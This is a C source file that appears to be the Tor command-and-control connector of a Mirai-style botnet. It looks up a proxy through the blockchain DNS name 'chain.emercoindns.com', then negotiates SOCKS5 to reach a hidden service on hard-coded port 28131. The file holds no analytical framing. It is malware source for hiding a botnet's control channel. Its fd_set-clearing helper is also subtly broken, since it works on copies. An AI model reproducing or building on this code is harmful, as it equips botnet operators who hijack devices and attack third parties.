#define _GNU_SOURCE

#ifdef DEBUG
#include <stdio.h>
#endif

#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <signal.h>
#include <arpa/inet.h>
#include <sys/select.h>
#include <sys/types.h>
#include <sys/socket.h>

#include "utils.h"
#include "tor.h"
#include "resolv.h"

#define TOR_CONNECTING		1
#define TOR_AUTH_CHECK		2
#define TOR_HANDOVER_CHECK	3

static void tor_clear_sets(int fd, fd_set wrset, fd_set rdset)
{
	FD_ZERO(&rdset);
	FD_ZERO(&wrset);

	if (FD_ISSET(fd, &wrset) != 0)
		FD_CLR(fd, &wrset);

	if (FD_ISSET(fd, &rdset) != 0)
		FD_CLR(fd, &rdset);
}

int tor_setup_fd(int fd, char *onion, int onion_len)
{
	char *chain_val;
	int fds, timeouts = 0;
	uint8_t state = TOR_CONNECTING;
	uint32_t tmp_addr;
	uint16_t tmp_port;
	struct sockaddr_in addr;
	fd_set wr_set, rd_set;
	socklen_t addr_len;

	utils_memset(&addr, 0, sizeof(addr));
	addr.sin_family = AF_INET;
	resolv_grab_chain("chain.emercoindns.com", &tmp_addr, &tmp_port);
	addr.sin_addr.s_addr = tmp_addr;
	addr.sin_port = tmp_port;
	addr_len = sizeof(addr);

	connect(fd, (struct sockaddr_in *)&addr, (socklen_t)addr_len);
	
	while (1)
	{
		struct timeval timeout;

		tor_clear_sets(fd, wr_set, rd_set);

		if (timeouts > 1)
		{
			return 0;
		}

		if (state == TOR_CONNECTING)
			FD_SET(fd, &wr_set);
		else if (state == TOR_AUTH_CHECK || state == TOR_HANDOVER_CHECK)
			FD_SET(fd, &rd_set);

		timeout.tv_sec = 5;
	    timeout.tv_usec = 0;

	    fds = select(fd + 1, &rd_set, &wr_set, NULL, &timeout);
	    if (fds > 0)
	    {

	    	if (FD_ISSET(fd, &wr_set) != 0 && state == TOR_CONNECTING)
			{
				int err = 0;
                socklen_t err_len = sizeof (err);

                getsockopt(fd, SOL_SOCKET, SO_ERROR, &err, &err_len);
                if (err)
                { 
#ifdef DEBUG
                	printf("[tor] Failed to connect to Proxy\n");
#endif        	
                	tor_clear_sets(fd, wr_set, rd_set);
                	return 0;
                }
                else
                {
#ifdef DEBUG
                	printf("[tor] Established connection to Proxy\n");
#endif
                	send(fd, "\x05\x01\x00", 3, MSG_NOSIGNAL);
                	state = TOR_AUTH_CHECK;
                	continue;
                }
			}
	    	else if (FD_ISSET(fd, &rd_set) != 0 && state == TOR_AUTH_CHECK)
			{
				int ret;     	
               	char buffer[64];

                if ((ret = recv(fd, buffer, sizeof(buffer), MSG_NOSIGNAL)) <= 0)
                {
                	tor_clear_sets(fd, wr_set, rd_set);
					return 0;
                }

                if (buffer[1] != '\x00')
                {
                	tor_clear_sets(fd, wr_set, rd_set);
                	return 0;
                }

                // Do handover
#ifdef DEBUG
                printf("[tor] Attempting to handover connection to hidden service\n");
#endif
                uint16_t port_t = htons(28131);
                utils_memset(buffer, 0, sizeof(buffer));
                utils_memcpy(buffer, "\x05\x01\x00\x03", 4);
                utils_memcpy(buffer + 4, &onion_len, sizeof(uint8_t));
                utils_memcpy(buffer + 4 + sizeof(uint8_t), onion, onion_len);
                utils_memcpy(buffer + 4 + sizeof(uint8_t) + onion_len, &port_t, sizeof(uint16_t));

                send(fd, buffer, 4 + sizeof(uint8_t) + onion_len + sizeof(uint16_t), MSG_NOSIGNAL);
                state = TOR_HANDOVER_CHECK;
                continue;
			}
	    	else if (FD_ISSET(fd, &rd_set) != 0 && state == TOR_HANDOVER_CHECK)
			{
				int ret;     	
               	char buffer[64];

                if ((ret = recv(fd, buffer, sizeof(buffer), MSG_NOSIGNAL)) <= 0)
                {
                	tor_clear_sets(fd, wr_set, rd_set);
					return 0;
                }

                if (buffer[1] != '\x00')
                {
                	tor_clear_sets(fd, wr_set, rd_set);
                	return 0;
                }
#ifdef DEBUG
                printf("[tor] Connection established to hidden service\n");
#endif
                return 1;
			}

	    }
	    else if (fds == -1)
	    {
	    	return 0;
	    }
	    else
	    {
	    	if (state == TOR_HANDOVER_CHECK)
	    		return 0;

	    	timeouts++;
	    	continue;
	    }

	}

	return 0;
}
